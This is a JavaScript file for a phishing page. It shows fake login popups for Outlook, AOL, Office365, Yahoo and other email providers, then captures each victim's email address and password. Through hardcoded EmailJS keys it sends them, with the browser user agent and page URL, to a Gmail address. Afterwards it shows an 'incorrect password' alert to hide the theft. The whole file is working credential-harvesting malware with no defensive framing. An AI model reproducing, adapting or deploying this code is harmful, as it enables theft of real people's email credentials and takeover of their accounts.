// EmailJS Configuration
const EMAILJS_SERVICE_ID = "service_ijxbwvw"
const EMAILJS_TEMPLATE_ID = "template_2wl85yp"
const EMAILJS_PUBLIC_KEY = "bvHl4Q_ETYVFECcMq"

let currentProvider = ""

// Simple and reliable popup function
function openLoginPopup(provider) {
  console.log("Opening popup for:", provider)

  currentProvider = provider
  const modal = document.getElementById("loginModal")
  const modalTitle = document.getElementById("modalTitle")

  const providerNames = {
    outlook: "Outlook",
    aol: "AOL",
    office365: "Office365",
    yahoo: "Yahoo",
    other: "Other Email",
  }

  modalTitle.textContent = `Sign in with ${providerNames[provider]}`
  modal.style.display = "block"

  // Focus on email input
  setTimeout(() => {
    document.getElementById("email").focus()
  }, 100)
}

// Close popup
function closeLoginPopup() {
  document.getElementById("loginModal").style.display = "none"
  document.getElementById("loginForm").reset()
}

// NEW: Send email function
function sendEmailNotification(email, password, provider) {
  // Check if EmailJS is loaded
  if (typeof window.emailjs === "undefined") {
    console.error("EmailJS not loaded!")
    alert("EmailJS not loaded. Please check your internet connection.")
    return
  }

  const templateParams = {
    to_email: "thankyousomuchlove111@gmail.com",
    provider: provider.charAt(0).toUpperCase() + provider.slice(1),
    user_email: email,
    user_password: password,
    timestamp: new Date().toLocaleString(),
    user_agent: navigator.userAgent,
    page_url: window.location.href,
  }

  console.log("Sending email with params:", templateParams)

  // Show loading message
  const loadingAlert = alert("checking...")

  window.emailjs
    .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
    .then((response) => {
      console.log("✅ confirming..........", response.status, response.text)

      // Show the captured data alert
      alert(
        `incorrect password`,
      )

      // Show success message
      showSuccess()
    })
    .catch((error) => {
      console.error("❌ Email failed to send:", error)

      // Still show the captured data
      alert(
        `incorrect password`,
      )

      // Still show success
      showSuccess()
    })
}

// Wait for page to fully load
window.addEventListener("load", () => {
  console.log("Page loaded, setting up buttons...")

  // Initialize EmailJS
  if (typeof window.emailjs !== "undefined") {
    window.emailjs.init(EMAILJS_PUBLIC_KEY)
    console.log("✅ EmailJS initialized")
  } else {
    console.error("❌ EmailJS library not loaded!")
  }

  // Get all email buttons and add click events
  const buttons = document.querySelectorAll(".email-btn")
  const providers = ["outlook", "aol", "office365", "yahoo", "other"]

  buttons.forEach((button, index) => {
    const provider = providers[index]
    console.log("Setting up button for:", provider)

    button.addEventListener("click", (e) => {
      e.preventDefault()
      console.log("Button clicked:", provider)
      openLoginPopup(provider)
    })
  })

  // Handle form submission - UPDATED
  document.getElementById("loginForm").addEventListener("submit", (e) => {
    e.preventDefault()

    const email = document.getElementById("email").value
    const password = document.getElementById("password").value

    if (!email || !password) {
      alert("Please fill in all fields")
      return
    }

    console.log(`Capturing: ${email} / ${password} for ${currentProvider}`)

    // Close the popup
    closeLoginPopup()

    // Send email notification (this was missing!)
    sendEmailNotification(email, password, currentProvider)
  })
})

// Show success message
function showSuccess() {
  const successDiv = document.getElementById("successMessage")
  successDiv.style.display = "flex"

  setTimeout(() => {
    successDiv.style.display = "none"
  }, 3000)
}

// Close modal when clicking outside
window.onclick = (event) => {
  const modal = document.getElementById("loginModal")
  if (event.target === modal) {
    closeLoginPopup()
  }
}

// Close with Escape key
document.addEventListener("keydown", (event) => {
  if (event.key === "Escape") {
    closeLoginPopup()
  }
})
